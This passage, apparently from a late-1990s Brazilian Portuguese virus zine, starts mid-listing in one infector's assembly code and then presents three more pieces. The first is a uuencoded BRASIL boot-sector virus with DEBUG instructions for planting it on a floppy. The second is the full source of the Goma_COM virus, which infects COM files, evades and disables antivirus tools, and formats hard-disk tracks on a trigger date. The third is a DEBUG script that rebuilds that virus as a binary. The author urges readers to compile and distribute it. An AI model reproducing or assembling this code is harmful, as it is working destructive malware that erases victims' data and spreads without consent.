        push    dx
        push    ax

        sub     ax, bx        ; Tamanho do arquivo - Tamanho do Header 
        sbb     dx, 0

        mov     cx, 10h
        div     cx

        mov     word ptr [bp+leiabuffer+0Eh], ax ; SS
        mov     word ptr [bp+leiabuffer+10h], id ; SP
        mov     word ptr [bp+leiabuffer+14h], dx ; IP
        mov     word ptr [bp+leiabuffer+16h], ax ; CS

        pop     ax
        pop     dx

        add     ax, Pilha-Inicio
        adc     dx, 0

        mov     cl, 9
        push    ax
        shr     ax, cl
        ror     dx, cl
        stc
        adc     dx, ax
        pop     ax
        and     ah, 1

        mov     word ptr [bp+leiabuffer+2], ax
        mov     word ptr [bp+leiabuffer+4], dx  ; Fixando o Header

        pop     bx
        mov     cx, 1Ah

Continue_Infectar:

        mov     ah, 40h
        mov     cx, Pilha-Inicio            ; Insere o v¡rus no fim do arquivo
        lea     dx, [bp+offset Inicio]
        int     21h

        mov     ax, 4200h
        xor     cx, cx                      ; Colocar o ponteiro no comeo do 
                                            ; arquivo 
        cwd
        int     21h

        mov     ah, 40h
        mov     cx, 1Ah                     ; Grava c¢digo pro v¡rus 
        lea     dx, [bp+offset leiabuffer]
        int     21h

        inc     [bp+Infeccoes]              ; Ja infectei quantos ? (?/3)

Fechar:
        mov     ax, 5700h     ; Voltar a data e hora original do arquivo
        inc     al
        pop     dx
        pop     cx
        int     21h

        mov     ah, 3Eh       ; Fechar o arquivo 
        int     21h

        pop     ax            ; Restaurar os atributos
        pop     dx
        pop     cx
        int     21h

        cmp     [bp+Infeccoes], 3
        jae     Ate
        mov     ah, 4Fh       ; 3/3 infecäes ? NÆo ? Infectar o pr¢ximo arq
        jmp     Proximo_arq

        mov     ah, 3Bh       ; Mudar o diret¢rio (Endereo)
        lea     dx, [bp+Dir_origem]         ; Restaurar o diret¢rio
        int     21h           ; Mudar o diret¢rio (ExecuÆo)

Ate:    ret

Mensagem:            
db      "",13,10
db      "Goma V¡rus versÆo 1.00 alpha por p0indexter em 1998 ",13,10
db      "Valeu Guino , Valeu Regis , Valeu irmÆos !          ",13,10
db      "Dedicado  mem¢ria de vocs 2 , valeu mesmo !       ",13,10
db      "... Goma para sempre seu bando de cururu ...        ",13,10
db      "Ã¾fr3ÓõrÓõãRa¢R+ÃÚ¥S.±ÓãRP+ÃÚ ¶¹",13,10,"$"

com_spec        db      '*.C?M',0           ; Paga uma na m scara do COM 
exe_spec        db      '*.E?E',0           ; e na do EXE entÆo ?

Raiz            db      '..',0

Pilha:
Dir_origem      db      64 dup (0)          ; Buffers do diret¢rio
NovoDTA         db      43 dup (?)          ; Novo acesso de transferncia do
                                            ; disco (DTA) ao p da letra .
Infeccoes       db      ?                   ; N£mero de arquivos infectados
leiabuffer      db      1ah dup (?)
Fim_da_Pilha:

Virus   ends
        end Inicio

; ÿ
;
;             ... Goma para sempre seu bando de cururu ... 
;                   `A mem¢ria de Regis e Guino
;             ... Goma para sempre seu bando de cururu ... 
;
;
; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;                       GOMA v¡rus versÆo 1.00 alpha  
; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ReCoRtA AqUi -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

     Ah , vai uma ficha tcnica com tamanho do v¡rus compilado , da 1¦ infec-
Æo , e tudo mais ! Piada , vai tomar no seu cu , testa ele e ve ai quantos
bytes tem o v¡rus , ah a data e hora do arquivo nÆo sÆo alteradas , ha ha 
muito loco !
     Bom galera acho que  isso ai o fonte esta ai nÆo falta nada pra compilar 
e esta comentado ,qualquer d£vida ou se quizer me mostrar alguma produÆo sua 
manda um mail .

     T+   p0indexter

                                                p0indexter@hotmail.com
-----------------------------------------------------------------------------                                


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  
                         ___         ___   ___    __    ___
              |  | |  | |__   |\ |  |     |   |  |  \  |__
              |__| |__| |___  | \|  |___  |___|  |__/  |___

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  



  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   7 - BRASIL boot virus (uuencodado) 
  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

        Segue abaixo o virus de boot BRASIL ja compilado e convertido para 
  .COM pelo EXE2BIN ou algo parecido , e' so desencodar e colocar no boot 
  de algum disquete . Retire o trecho desde "begin 600" ate' "end" e chame 
  do que voce quizer , para desencodar utilize o UUdecode que seguiu acima.
       Ah, caso voce nao manje como colocar o brasil no boot , vide exemplo
  de instalacao de programas no boot atraves do debug do proprio DOS.

       Chame o debug e coloque o nome do virus como parametro , no caso :

                   Debug brasil.bin 
       
       Na linha do debug digite :

                   - w 100 0 0 1

              100 -> endereco
              0   -> drive
              0   -> primeiro setor
              1   -> numero

;;;;;;;;;;;;;;;;;;;;; Brasil.uue ;;;;;;;;;;;;;;;;;;;;;;;;;;;;
begin 600 brasil.bin
MZQZ0*'->-VM)2$,``@(!``)P`-`"_0(`"0`"```````SP/J.T+P`?/OJ+@#`
M!X[8H1,$2*,3!$BQ!M/@+J-$`8[`+J"K`:*0!`X?_#/VB_ZYK`'SI"[_+D(!
M#A^X`0*[``*Y`0"Z@`#-$X$^J`//SW1!N`$#L0/-$[^X`;ZX`[E(`/.DQ@:J
M`8"X`0,SV[D!`,T3Q@:J`0"X`0*[``*+#J0!BQ:F`<T3N`$#N0(`NH``S1.X
M`0*[``2`/JH!`'0+L0*Z@`#-$[$#ZQ*+#J0!BQ:F`<T3BPZ@`8HVIP$SP([`
MN`$"NP!\S1,.![@!`KL``KD"`+J``,T3H/<#HO<%N`$"NP`"L0&Z@`'-$RZ@
M&`(NHO0%+J`:`BZB]04SP([8H4P`+J/P!:%.`"ZC\@7Z,\"C3`",P`5``*-.
M`/OJ`'P``%H`@)\`````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M```````````````#```!`@```<_/`'0```````````````````````"``0$`
M!@_S\#,```#]CPP`````````````````````````````````````````````
1````````````````````5:IP
`
end
;;;;;;;;;;;;;;;;;;;;; Brasil.uue ;;;;;;;;;;;;;;;;;;;;;;;;;;;;


        Bom grande , belezinha o virus ta ai e as explicacoes seguiram
  ai acima , tenha um bom divertimento ...


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  
                               /  __           ___          
                        |  /  |  |__)  |   |  (__           
                        |/    |  |  \  |___|  ___)          
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  


  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   8 - Goma_COM (codigo-fonte) 
  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


        Bom ai oh , ta ai meu virus , e' o primeiro de minha autoria , sem
  bugs , sem porra nenhuma para falar mal , ele e' 100% , favor divertir-se 
  bastante ...

        E' so' compilar/linkar e distribuir ...


             ... Goma para sempre seu bando de cururu ... 
                   `A memoria de Regis e Guino
             ... Goma para sempre seu bando de cururu ... 

 Comentarios :

 O virus tem 1002 bytes de tamanho , infecta arquivos com (quantos existirem
 no diretorio que o virus se encontra ) , nao altera data nem hora das vi-
 timas , e' um virus de appending , ou seja , ele insere seu codigo apos o
 final do arquivo.

 - Infecta arquivos COM 
        Verifica se arquivo ja foi infectado , se e' realmente COM , se e'
 um arquivo isca e se nao vai dar estouro de divisao .

 - Sem Flags no TBAV , Nada na Heuristica do F-PROT e Nada no DEEP do AVP
        Quer dizer o virus e' 100 % desconhecido !!!!

 - Data de Ativacao
        22/10/????   Data do falecimento dos nosso dois camaradas (valeu   
 irmaos ,esse e' por voces .)

 - Acao do virus
        Multiplicacao , Formatacao das 9 primeiras cabecas da HD , 35 bips
 e mensagem (e' logico) !!!

 - Rotinas que merecem destaque:
        A mascara dos arquivos a serem procurados (*.COM) sofreu uma leve
 alteracao . (Sem Flags)
        Removedor do Vsafe ou Vwatch . (Sem Flags)
        Verificador se TBmem esta na memoria e se estiver , avise e de um
 boot.

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; GOMA_COM ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
page          22101997
title         Virus Brasil n§1 em 1999 por nim_bus@hotmail.com
name          Goma_COM                 
                                       ;
.286c                                  ; Instrucoes 80286 
.model tiny                            ; Modelo de memoria
                                       ;
;;;;;;;;;;;;;;;;;;    CONSTANTES     ;;;;;;;;;;;;;;;;;;;;;;;;
Data_Hora_Sistema       equ   2ah                           ;
Mes_Ativacao            equ   10                            ;
Dia_Ativacao            equ   22                            ;
Bips                    equ   0e07h                         ;    
Fechar_arquivo          equ   3eh                           ;
Abrir_arquivo           equ   3d02h                         ;
Area_transferencia_DTA  equ   1ah                           ;
Ler_arquivo             equ   3fh                           ;
Achar_Primeiro          equ   4eh                           ;
Mais_arquivos           equ   4fh                           ;
Arquivos_COM            equ   100h                          ;
Ponteiro_Ler_Gravar     equ   42h                           ;    
Vsafe_Vwatch            equ   0fa00h                        ;
Tbav                    equ   0ca00h                        ;
Data_Hora               equ   5700h                         ;
Atributos               equ   4300h                         ;
Tamanho_Virus           equ   Fim_virus - Inicio_Virus      ;
Tres_bytes              equ   Fim_virus - Inicio_Virus + 3  ;
;;;;;;;;;;;;;;;;;;    CONSTANTES     ;;;;;;;;;;;;;;;;;;;;;;;;
                                       ;
Virus         segment byte public 'Virus'  ; Inicio do codigo do virus
              assume  cs:Virus,ds:Virus,es:nothing,ss:nothing  ;
              org     Arquivos_COM     ; Inicio de arquivos COM 
                                       ;
Inicio:                                ;
              db      0E9h,3,0         ; Salto para o virus
                                       ;
Original_COM:                          ;
              db      0CDh,20h,0       ; Inicio real do virus 
                                       ;
Inicio_Virus:                          ;
              nop                      ; Nada nao
              nop                      ;
              nop                      ;
                                       ;
              call    avp              ; Chamada de procedimento
                                       ;
              push    ds es            ;
                                       ;
              lea     dx,[bp + offset Nova_Area_DTA]  ; Data Transfer Area 
              mov     ah,Area_transferencia_DTA       ; DTA
              int     33               ;
                                       ;
;;;;;;;;;;;;;;   FUNCOES   ;;;;;;;;;;;;;
              call    Retira_Vsafe     ;
              call    Tbav_instalado   ;
              call    Ativacao         ;
;;;;;;;;;;;;;;   FUNCOES   ;;;;;;;;;;;;;
                                       ;
              call    Infectar_dir     ;
                                       ;
              pop     es ds            ;  
              call    data_area        ;  
              int     33               ;  
                                       ;  
              lea     si,[bp + Original_COM]  ; Restaurar o arquivo
              mov     di,Arquivos_COM  ;  Inicio do arquivo
              push    di               ;         
                                       ;
              call    mover_string     ;
                                       ;
              call    Registradores    ;
              ret                      ;
                                       ;
avp:                                   ;
              call    $ + 3            ;  
              pop     bp               ;  Chamando os ponteiros
              sub     bp,offset $ - 1  ;
              ret                      ;
                                       ;
Registradores:                         ;
              xor     ax,ax            ;
              cwd                      ;     
              xor     bx,bx            ;
              mov     si,Arquivos_COM  ;
              call    Registradores_1  ;
                                       ;
Registradores_1:                       ;
              xor     di,di            ;
              xor     bp,bp            ;
              ret                      ;
                                       ;
Mover_string:                          ;
              movsw                    ;
              movsb                    ;
              ret                      ;
                                       ;
Sem_acao:                              ;
              ret                      ; 
                                       ;
Data_area:                             ;
              mov     dx,80h           ; Restaurar DTA original
              mov     ah,Area_transferencia_DTA   ;
              ret                      ;
                                       ;
Infectar_dir:                          ;
              mov     ah,Achar_Primeiro   ; Achar primeiro arquivo DOS 
              call    Ponto_COM           ; Funcao despistador de anti virus
              lea     dx,[bp + Mascara]   ; Procurar .COM 
              int     33                  ;
              call    Ponto_COM_1         ; Funcao despistador de anti virus
              jc      Beleza           ; 
                                       ;
Proximo_arquivo:                       ;
              lea     dx,[bp + Nova_Area_DTA + 1Eh]  ; Achou 
              call    Infecta          ;  Infecte
              mov     ah,Mais_arquivos ;
              int     33               ;
              jnc     Proximo_arquivo  ;  Vai procurando ...
                                       ;
Beleza:                                ;
              ret                      ;
                                       ;
Mascara       db      '$ÿTDGÿ.BOM',0   ; Porque precisa ser .COM ?
                                       ;
Ativacao:                              ;
              mov     ah,Data_Hora_Sistema ;
              call    despistador      ;
                                       ;
              cmp     dh,mes_ativacao  ;
              jne     Sem_acao         ;
                                       ;
              cmp     dl,dia_ativacao  ;
              jne     Sem_acao         ;
                                       ;
                                       ;
              mov     ah,09h           ;                  
              lea     dx,[bp+msg_espera] ;                 
              int     21h              ;
                                       ;
              call    format           ;
                                       ;
              mov     ah,09h           ;                  
              lea     dx,[bp+mensagem] ;                 
              int     21h              ;
                                       ;
              mov     ah, 0            ; Espera por uma tecla
              int     16h              ;
                                       ;
              ret                      ;
                                       ;
                                       ;
Ponto_COM:                             ;
              inc     byte ptr [bp + offset mascara]
              inc     byte ptr [bp + offset mascara]
              inc     byte ptr [bp + offset mascara]
              inc     byte ptr [bp + 7 + offset Mascara]  ;
              inc     byte ptr [bp + offset mascara]
              inc     byte ptr [bp + offset mascara]
              inc     byte ptr [bp + offset mascara]
              ret                      ;
                                       ;
Tb_msg:                                               ;
db    'Erro: TBAV na memoria .',13,10                 ;
db    'Solucao: Desistale e tente novamente .',13,10  ;
db    'Aperte alguma tecla para boot ...$'            ;
                                       ;
                                       ;
Infecta:                               ;
              push    si               ;
              mov     ax,Atributos     ; Ver os atributos do arquivo
              int     33               ;
                                       ;
              push    cx dx ds         ;
              xor     cx,cx            ; Zera-los 
              call    Attrib_funcao    ;
                                       ;
              mov     ax,Abrir_arquivo ; Abrir_arquivo
              int     33               ;
                                       ;
              jc      Erro             ; Nao consegui . :(
              xchg    bx,ax            ;
                                       ;
              mov     ax,Data_Hora     ; Guarde a data e a hora do arquivo
              int     33               ;
                                       ;
              push    cx dx            ;
              mov     ah,Ler_arquivo   ; Ler o arquivos
              mov     cx,28            ; Ler os 28 primeiros bytes
              lea     dx,[bp + Buffer_leitura] ; Ler a header (original)
              int     33               ;
                                       ;
              cmp     byte ptr [bp + Buffer_leitura],'M'  ; Tem 'M' nos 2 
                                                          ; primeiros bytes
              je      Nao_infectar     ; entao  EXE , nao infecte .
                                       ;
              mov     al,2             ; Vamos para o fim do arquivo inserir 
                                       ; o virus
              call    Ponteiros        ; Entao vamos !
                                       ;
              cmp     dx,65279 - Tres_bytes ; Estouro de divisao ?
              ja      Nao_infectar     ; Nao infecte 
                                       ;
              cmp     dx,14            ; Arquivo isca (muito pequeno)
              jb      Nao_infectar     ; Nao infecte 
                                       ;
              sub     dx,Tres_bytes    ; Ver se ja esta infectado 
              cmp     dx,word ptr [bp + Buffer_leitura + 1]  ; Esta ?
              je      Nao_infectar     ; Nao infecte
                                       ;
              add     dx,Tres_bytes    ; Insere la !!!
              mov     word ptr [bp + Novo_laco + 1],dx  ;
              lea     dx,[bp + Buffer_leitura] ; Salvar a header (original)
              int     33               ;
                                       ;
              call    Escrever_arquivo ;
                                       ;
              xor     al,al            ; Volta para o comeco do arquivo 
              call    Ponteiros        ;
                                       ;
              lea     dx,[bp + Novo_laco] ; 
              int     33               ;
                                       ;
Restaurar_data_hora:                   ;
              pop     dx cx            ;
              mov     ax,Data_Hora     ; Restaurar a data e o horario do 
              inc     al               ; arquivo       
              int     33               ;
                                       ;
Fechar:                                ;
              pop     ds dx cx         ; Atributos (deixar sem nenhum)
              call    Attrib_funcao    ;
                                       ;
              mov     ah,Fechar_arquivo; Fechar arquivo
              int     33               ;
                                       ;
Erro:                                  ;
              pop     si               ;
              ret                      ;
                                       ;
Tbav_instalado:                        ;
              mov     ax,Tbav          ; Ver se o TBSCANX esta instalado 
              mov     bx,'TB'          ; TB=TBscanx
              int     2fh              ;
                                       ;
              cmp     al,0             ; al = 0 ; TBSCANX nÆo esta instalado 
              jne     Tbav_erro        ; Esta ? Nao vamos marcar toca . Essa
                                       ; porra monitora tudo , da um boot e 
                                       ; manda o cara tirar ele da memoria !
                                       ;
              ret                      ; Nao esta , retorne e continua a 
                                       ; execucao do virus
                                       ;
                                       ;
Tbav_erro:                             ; Bom , o TBmen esta na memoria , vamos
                                       ; dar um boot e pedir pro cara desligar           
                                       ; o monitoramento . 
              mov     ah,09h           ; Escrever a mensagem
              lea     dx,[bp+Tb_msg]   ;           
              int     33               ;
                                       ;
              mov     ah, 0            ; Esperar por uma tecla para 
              int     16h              ;
                                       ;
              int     19h              ; Dar o Boot
                                       ;
              ret                      ; Quer dizer , em tese , agente volta .
                                       ;
                                       ;
Attrib_funcao:                         ;
              mov     ax,Atributos     ;
              inc     al               ;
              int     33               ;
              ret                      ;
                                       ;
Escrever_arquivo:                      ;
              call    Panda            ;
              mov     cx,Tamanho_Virus ; Tamanho do virus
              lea     dx,[bp + Inicio_Virus] ; Comeco do virus 
              int     33               ;  
              ret                      ;
                                       ;
Nao_infectar:                          ;
              pop     cx dx            ; Deu algum chabu . Ja ta infectado ,  can't infect, skip
                                       ;  EXE , isca ou dara estouro de 
                                       ; divisao .
              jmp     Fechar           ;
Ponteiros:                             ;
              mov     ah,Ponteiro_Ler_Gravar ; Ponteiro de leitura e gravacao
              xor     cx,cx            ;  Coloque o offset em zero
              cwd                      ;  
              int     33               ;
                                       ;
              mov     dx,ax            ;  Mudar registradores (conteudo)
              mov     ah,40h           ;
              mov     cx,3             ;
              ret                      ;
                                       ;
Panda:                                 ;
              mov     ah,40h           ;  Escrever o virus dentro do arquivo 
              ret                      ;
                                       ;
                                       ;
Mensagem:                              ;
db "[TDG'99]",13,10                    ;                
db "       Goma_COM_99 por Nim_Bus",13,10,13,10                           ;
db " ... Goma para sempre seu bando de Cururu ... ",13,10,13,10           ;
db " Agradecimentos :",13,10                                              ;
db " Turma Da Goma (especialmente para o Regis e pro Guino)",13,10        ;
db " WoH Brazillian Group , Unicamp EQ-98 , e para a minha ",13,10        ;
db " mina . DANI EU TE AMO ...",13,10,13,10                               ;
db " Cidade Patriarca - Zona Leste - SP - Sao Paulo - Brasil",13,10,13,10 ;
db "Boa sorte , ah aperta alguma tecla para continuar ...",13,10,"$"      ;
                                       ;
                                       ;
Ponto_COM_1:                           ;
              dec     byte ptr [bp + offset mascara]
              dec     byte ptr [bp + offset mascara]
              dec     byte ptr [bp + offset mascara]
              dec     byte ptr [bp + 7 + offset Mascara] ;
              dec     byte ptr [bp + offset mascara]
              dec     byte ptr [bp + offset mascara]
              dec     byte ptr [bp + offset mascara]
              ret                      ;
                                       ;
                                       ;
Format        proc    near             ;         
              mov     ch,0             ; Track zero
              mov     dx,80h           ; Cabeca zero, 1¦ HD
                                       ;
Fodendo:                               ;
              mov     ch,0             ; Track zero
              mov     al,0             ; Carregue zero
              mov     cl,6             ; Vezes (vai dar zero)
              shl     al,cl            ; 
              mov     cl,al            ; Mover resultado (zero)
              or      cl,1             ; Um agora (proxima linha zero)
              mov     ax,500h          ; Formata track
              call    zuei             ; 
              jb      Bip              ; Ja deu vamos bipar
              inc     dh               ; Proxima cabeca
              cmp     dh,9             ; Ja estamos na nona cabeca ?
              jne     Fodendo          ; Formata se nao
                                       ;
Format        endp                     ;
                                       ;
Bip:                                   ; Rotina de "emissao de aviso sonoro"
              mov     cx,35            ; cx = numero de bips
beep:                                  ;
              mov     ax,Bips          ; chr do bip
              int     10h              ; Bip
loop beep                              ; Ate 35 , por favor !!
              ret                      ; Retorne
                                       ;
                                       ;
Retira_Vsafe:                          ; Retirar o Vsafe ou o Vwatch da 
                                       ; memoria
              mov     ax,Vsafe_Vwatch  ; Endereco que ele fica alocado     
              inc     al               ;      
              mov     dx,5945h         ; 
              call    Despistador      ; Desalocado se nao existem mais TSR's        
                                       ; carregados apos ele .
              ret                      ;
                                       ;
Despistador:                           ;
              int     33               ;
              ret                      ;
                                       ;
Zuei:                                  ;
              int     13H              ; I/O
              ret                      ;
                                       ;
                                       ;
Msg_espera    db      'Aguarde alguns instantes ...$' ; 
                                       ;
Novo_laco     db      0E9h,0,0         ;
                                       ;
Fim_virus:                             ;
Buffer_leitura        db      28 dup (?)       ;   read buffer
Nova_Area_DTA         db      128 dup(?)       ;
                                       ;
Virus         ends                     ;
              end     Inicio           ; EOV
                                       ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; GOMA_COM ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

        Bom , ai foi meu virus , e sei la acho que ta valendo qualquer
    coisa da um toque para ver no que podemos melhora-lo , em edicoes
    futuras creio que teremos o GOMA_EXE , mas infectar EXE e'um pouco
    mais complicado que infectar COM , mas ta valendo , bom e' isso ai .




ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                      ___   ___   __   .   __   ___
                     (__   |     |__)  |  |__)   |
                     ___)  |___  |  \  |  |      |
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   9 - Goma_COM (Script File) 
  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

          Essa parte do zine contem um script para ser utilizado no debug
  do dos , esse script cria o virus Goma_COM a partir do debug pelo simples
  comando:

                        DEBUG < (arquivo.scr)

          Recorte o script abaixo ( delimitado pelos ;;;; Goma_com.scr ;;; ) 
  e crie um arquivo com qualquer nome e em seguida rode o comando dado acima, 
  pronto , o debug acaba de criar o virus GOMA_COM no arquivo GOMA_COM.COM.


;;;;;;;;;;;;;;;;; GOMA_COM.SCR ;;;;;;;;;;;;;;;;;;;;;;;
N GOMA_COM.COM
E 0100 E9 03 00 CD 20 00 90 90 90 E8 2C 00 1E 06 8D 96 
E 0110 09 05 B4 1A CD 21 E8 A2 03 E8 93 01 E8 65 00 E8 
E 0120 39 00 07 1F E8 2E 00 CD 21 8D B6 03 01 BF 00 01 
E 0130 57 E8 1D 00 E8 0A 00 C3 E8 00 00 5D 81 ED 3B 01 
E 0140 C3 33 C0 99 33 DB BE 00 01 E8 00 00 33 FF 33 ED 
E 0150 C3 A5 A4 C3 C3 BA 80 00 B4 1A C3 B4 4E E8 4B 00 
E 0160 8D 96 79 01 CD 21 E8 02 03 72 0D 8D 96 27 05 E8 
E 0170 C0 00 B4 4F CD 21 73 F3 C3 24 FF 54 44 47 FF 2E 
E 0180 42 4F 4D 00 B4 2A E8 3E 03 80 FE 0A 75 C6 80 FA 
E 0190 16 75 C1 B4 09 8D 96 CD 04 CD 21 E8 F1 02 B4 09 
E 01A0 8D 96 F6 02 CD 21 B4 00 CD 16 C3 3E FE 86 79 01 
E 01B0 3E FE 86 79 01 3E FE 86 79 01 3E FE 86 80 01 3E 
E 01C0 FE 86 79 01 3E FE 86 79 01 3E FE 86 79 01 C3 45 
E 01D0 72 72 6F 3A 20 54 42 41 56 20 6E 61 20 6D 65 6D 
E 01E0 6F 72 69 61 20 2E 0D 0A 53 6F 6C 75 63 61 6F 3A 
E 01F0 20 44 65 73 69 73 74 61 6C 65 20 65 20 74 65 6E 
E 0200 74 65 20 6E 6F 76 61 6D 65 6E 74 65 20 2E 0D 0A 
E 0210 41 70 65 72 74 65 20 61 6C 67 75 6D 61 20 74 65 
E 0220 63 6C 61 20 70 61 72 61 20 62 6F 6F 74 20 2E 2E 
E 0230 2E 24 56 B8 00 43 CD 21 51 52 1E 33 C9 E8 8B 00 
E 0240 B8 02 3D CD 21 72 66 93 B8 00 57 CD 21 51 52 B4 
E 0250 3F B9 1C 00 8D 96 ED 04 CD 21 3E 80 BE ED 04 4D 
E 0260 74 7E B0 02 E8 7D 00 81 FA 15 FB 77 73 83 FA 0E 
E 0270 72 6E 81 EA EA 03 3E 3B 96 EE 04 74 63 81 C2 EA 
E 0280 03 3E 89 96 EB 04 8D 96 ED 04 CD 21 E8 44 00 32 
E 0290 C0 E8 50 00 8D 96 EA 04 CD 21 5A 59 B8 00 57 FE 
E 02A0 C0 CD 21 1F 5A 59 E8 22 00 B4 3E CD 21 5E C3 B8 
E 02B0 00 CA BB 42 54 CD 2F 3C 00 75 01 C3 B4 09 8D 96 
E 02C0 CF 01 CD 21 B4 00 CD 16 CD 19 C3 B8 00 43 FE C0 
E 02D0 CD 21 C3 E8 1D 00 B9 E7 03 8D 96 06 01 CD 21 C3 
E 02E0 59 5A EB BF B4 42 33 C9 99 CD 21 8B D0 B4 40 B9 
E 02F0 03 00 C3 B4 40 C3 5B 54 44 47 27 39 39 5D 0D 0A 
E 0300 20 20 20 20 20 20 20 47 6F 6D 61 5F 43 4F 4D 5F 
E 0310 39 39 20 70 6F 72 20 4E 69 6D 5F 42 75 73 0D 0A 
E 0320 0D 0A 20 2E 2E 2E 20 47 6F 6D 61 20 70 61 72 61 
E 0330 20 73 65 6D 70 72 65 20 73 65 75 20 62 61 6E 64 
E 0340 6F 20 64 65 20 43 75 72 75 72 75 20 2E 2E 2E 20 
E 0350 0D 0A 0D 0A 20 41 67 72 61 64 65 63 69 6D 65 6E 
E 0360 74 6F 73 20 3A 0D 0A 20 54 75 72 6D 61 20 44 61 
E 0370 20 47 6F 6D 61 20 28 65 73 70 65 63 69 61 6C 6D 
E 0380 65 6E 74 65 20 70 61 72 61 20 6F 20 52 65 67 69 
E 0390 73 20 65 20 70 72 6F 20 47 75 69 6E 6F 29 0D 0A 
E 03A0 20 57 6F 48 20 42 72 61 7A 69 6C 6C 69 61 6E 20 
E 03B0 47 72 6F 75 70 20 2C 20 55 6E 69 63 61 6D 70 20 
E 03C0 45 51 2D 39 38 20 2C 20 65 20 70 61 72 61 20 61 
E 03D0 20 6D 69 6E 68 61 20 0D 0A 20 6D 69 6E 61 20 2E 
E 03E0 20 44 41 4E 49 20 45 55 20 54 45 20 41 4D 4F 20 
E 03F0 2E 2E 2E 0D 0A 0D 0A 20 43 69 64 61 64 65 20 50 
E 0400 61 74 72 69 61 72 63 61 20 2D 20 5A 6F 6E 61 20 
E 0410 4C 65 73 74 65 20 2D 20 53 50 20 2D 20 53 61 6F 
E 0420 20 50 61 75 6C 6F 20 2D 20 42 72 61 73 69 6C 0D 
E 0430 0A 0D 0A 42 6F 61 20 73 6F 72 74 65 20 2C 20 61 
E 0440 68 20 61 70 65 72 74 61 20 61 6C 67 75 6D 61 20 
E 0450 74 65 63 6C 61 20 70 61 72 61 20 63 6F 6E 74 69 
E 0460 6E 75 61 72 20 2E 2E 2E 0D 0A 24 3E FE 8E 79 01 
E 0470 3E FE 8E 79 01 3E FE 8E 79 01 3E FE 8E 80 01 3E 
E 0480 FE 8E 79 01 3E FE 8E 79 01 3E FE 8E 79 01 C3 B5 
E 0490 00 BA 80 00 B5 00 B0 00 B1 06 D2 E0 8A C8 80 C9 
E 04A0 01 B8 00 05 E8 23 00 72 07 FE C6 80 FE 09 75 E4 
E 04B0 B9 23 00 B8 07 0E CD 10 E2 F9 C3 B8 00 FA FE C0 
E 04C0 BA 45 59 E8 01 00 C3 CD 21 C3 CD 13 C3 41 67 75 
E 04D0 61 72 64 65 20 61 6C 67 75 6E 73 20 69 6E 73 74 
E 04E0 61 6E 74 65 73 20 2E 2E 2E 24 E9 00 00 
RCX
03ED
W
Q
;;;;;;;;;;;;;;;;; GOMA_COM.SCR ;;;;;;;;;;;;;;;;;;;;;;;


          Bom o script do Goma_COM esta ai , e' so'fazer o menino virar
   .COM e sair distribuindo a revelia .
          Esse script foi colocado seila' bem eu o porque , mas caso voce
   so' tivesse visto scripts de virus "importados" , ta ai as fontes e o
   script de um virus "nacional" ; em tese os scripts eram utilizados para
   que leitores de zines (no caso de zines de virus e tambem alguns zines
